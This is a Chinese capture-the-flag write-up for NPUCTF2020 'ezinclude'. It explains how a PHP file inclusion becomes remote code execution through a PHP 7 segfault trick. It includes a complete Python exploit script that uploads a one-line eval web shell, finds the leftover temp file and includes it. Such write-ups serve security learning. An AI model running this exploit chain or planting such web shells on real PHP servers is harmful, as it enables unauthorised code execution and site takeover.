# \[NPUCTF2020]ezinclude

## \[NPUCTF2020]ezinclude

## 考点

* 从LFI到RCE
* 利用session.upload\_progress进行文件包含
* 利用php7 Segment Fault

## wp

打开直接显示`username/password error`

F12提示`md5($secret.$name)===$pass`

查看返回头给了HASH

```
Set-Cookie: Hash=fa25e54758d5d5c1927781a6ede89f8a; expires=Fri, 25-Feb-2022 05:50:05 GMT; Max-Age=3600000
```

这就相当于告诉了name和pass，访问`/?name=&pass=fa25e54758d5d5c1927781a6ede89f8a`跳转到404页面，用burp抓包可以看到未跳转的页面

![](<../../.gitbook/assets/image (10) (1) (1) (1).png>)

访问flflflflag.php，发现是404，再抓包

![](<../../.gitbook/assets/image (30).png>)

是一个文件包含，直接尝试PHP伪协议`php://filter/read=convert.base64-encode/resource=index.php`

```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
  echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
  </script>
';
}else{
  setcookie("Hash",md5($secret.$name),time()+3600000);
  echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

flflflflag.php

```php
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
  die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>
```

目录扫描可以找到dir.php

```php
<?php
var_dump(scandir('/tmp'));
?>
```

然后就没找到什么了，可能是LFI到RCE，对了，返回头写了PHP的版本是7.0

本来想用session.upload\_progress进行文件包含，可能是buu的限制没成功。那就换个思路，用[php7 Segment Fault](https://qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/#toc-heading-19)

```php
import requests 
from io import BytesIO 
import re 

files = { 
    'file': BytesIO(b'<?php eval($_POST["cmd"]);?>') 
} 

url1 = 'http://59a657ea-09e5-49b8-a6db-c271b6157877.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php' 

r = requests.post(url=url1, files=files, allow_redirects=False) 

url2 = 'http://59a657ea-09e5-49b8-a6db-c271b6157877.node4.buuoj.cn:81/flflflflag.php?file=dir.php' 

r = requests.get(url2,allow_redirects=False) 
data = re.search(r"php[a-zA-Z0-9]{1,}", r.content.decode()).group(0) 


print("++++++++++++++++++++++")
print(data) 
print("++++++++++++++++++++++") 


url3='http://59a657ea-09e5-49b8-a6db-c271b6157877.node4.buuoj.cn:81/flflflflag.php?file=/tmp/'+data


data = { 'cmd':"phpinfo();" } 


r = requests.post(url=url3,data=data,allow_redirects=False) 

print(r.content)
```

我说怎么一直system不动，原来给ban了，所以用session.upload\_progress进行文件包含也是可以的。

![](<../../.gitbook/assets/image (3) (1) (1).png>)

写入shell后用蚁剑然后bypass

![](<../../.gitbook/assets/image (15) (1).png>)

## 小结

1. 从LFI到RCE
2. 代码执行先看看`phpinfo()`有没有东西
